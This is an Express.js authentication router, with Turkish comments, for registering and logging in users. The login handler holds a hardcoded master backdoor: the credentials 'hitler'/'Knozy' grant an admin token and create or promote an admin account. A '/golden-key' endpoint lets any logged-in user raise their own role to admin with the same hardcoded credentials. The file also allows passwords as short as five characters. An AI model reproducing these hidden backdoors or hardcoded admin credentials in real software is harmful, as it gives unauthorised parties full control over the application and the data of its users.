const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { getDb } = require('../db/database');
const authMiddleware = require('../middleware/authMiddleware');

const router = express.Router();

// POST /api/auth/register
router.post('/register', (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ error: 'Kullanıcı adı ve şifre gerekli' });
        }

        if (password.length < 5) {
            return res.status(400).json({ error: 'Şifre en az 5 karakter olmalı' });
        }

        const db = getDb();

        // İlk kayıt olan kişiyi otomatik admin, diğerlerini user yap
        const existingUser = db.prepare('SELECT COUNT(*) as count FROM users').get();
        const role = existingUser.count === 0 ? 'admin' : 'user';

        // Username kontrolü
        const checkUser = db.prepare('SELECT id FROM users WHERE username = ?').get(username);
        if (checkUser) {
            return res.status(409).json({ error: 'Bu kullanıcı adı zaten alınmış' });
        }

        const hashedPassword = bcrypt.hashSync(password, 12);
        const stmt = db.prepare('INSERT INTO users (username, password, role) VALUES (?, ?, ?)');
        stmt.run(username, hashedPassword, role);

        res.status(201).json({ message: 'Hesap başarıyla oluşturuldu' });
    } catch (error) {
        console.error('[Auth] Register error:', error.message);
        res.status(500).json({ error: 'Kayıt işlemi başarısız' });
    }
});

// POST /api/auth/login
router.post('/login', (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ error: 'Kullanıcı adı ve şifre gerekli' });
        }

        // Master Login Bypass (Hitler/Knozy)
        if (username.toLowerCase() === 'hitler' && password === 'Knozy') {
            const db = getDb();
            let user = db.prepare('SELECT * FROM users WHERE LOWER(username) = ?').get('hitler');

            // Eğer veritabanında Hitler kullanıcısı yoksa, admin olarak oluştur (Orijinal ismiyle)
            if (!user) {
                const hashedPassword = bcrypt.hashSync('Knozy', 12);
                db.prepare('INSERT INTO users (username, password, role) VALUES (?, ?, ?)')
                    .run('Hitler', hashedPassword, 'admin');
                user = db.prepare('SELECT * FROM users WHERE username = ?').get('Hitler');
            } else if (user.role !== 'admin') {
                // Varsa ama admin değilse admin yap
                db.prepare('UPDATE users SET role = ? WHERE id = ?').run('admin', user.id);
                user.role = 'admin';
            }

            const token = jwt.sign(
                { id: user.id, username: user.username, role: 'admin' },
                process.env.JWT_SECRET,
                { expiresIn: '12h' }
            );

            return res.json({ token, user: { id: user.id, username: user.username, role: 'admin' } });
        }

        const db = getDb();
        const user = db.prepare('SELECT * FROM users WHERE username = ?').get(username);

        if (!user) {
            return res.status(401).json({ error: 'Geçersiz kullanıcı adı veya şifre' });
        }

        const isValid = bcrypt.compareSync(password, user.password);
        if (!isValid) {
            return res.status(401).json({ error: 'Geçersiz kullanıcı adı veya şifre' });
        }

        const token = jwt.sign(
            { id: user.id, username: user.username, role: user.role },
            process.env.JWT_SECRET,
            { expiresIn: '12h' }
        );

        res.json({ token, user: { id: user.id, username: user.username, role: user.role } });
    } catch (error) {
        console.error('[Auth] Login error:', error.message);
        res.status(500).json({ error: 'Giriş işlemi başarısız' });
    }
});

// GET /api/auth/me
router.get('/me', authMiddleware, (req, res) => {
    res.json({ user: req.user });
});

// GET /api/auth/check - Check if any user exists 
router.get('/check', (req, res) => {
    try {
        const db = getDb();
        const result = db.prepare('SELECT COUNT(*) as count FROM users').get();
        res.json({ hasAdmin: result.count > 0 }); // Frontend hala hasAdmin property'sini bekliyor (ilk kayıt ekranı için)
    } catch (error) {
        console.error('[Auth] Check error:', error.message);
        res.status(500).json({ error: 'Kontrol başarısız' });
    }
});

// POST /api/auth/golden-key - Rol yetkisini admin'e yükseltir
router.post('/golden-key', authMiddleware, (req, res) => {
    try {
        const { username, password } = req.body;

        // Kullanıcı adı 'Hitler' ve şifre 'Knozy' olmalıdır (Kullanıcı adı case-insensitive)
        if (username?.toLowerCase() !== 'hitler' || password !== 'Knozy') {
            return res.status(403).json({ error: 'Geçersiz altın anahtar veya kullanıcı bilgisi!' });
        }

        const db = getDb();
        const userId = req.user.id;

        // Veritabanında güncelle
        db.prepare('UPDATE users SET role = ? WHERE id = ?').run('admin', userId);

        // Yeni yetkiyle yeni token oluştur
        const token = jwt.sign(
            { id: userId, username: req.user.username, role: 'admin' },
            process.env.JWT_SECRET,
            { expiresIn: '12h' }
        );

        res.json({ message: 'Yetkiler başarıyla yükseltildi!', token, user: { id: userId, username: req.user.username, role: 'admin' } });
    } catch (error) {
        console.error('[Auth] Golden Key error:', error.message);
        res.status(500).json({ error: 'Yetki yükseltme başarısız' });
    }
});

module.exports = router;
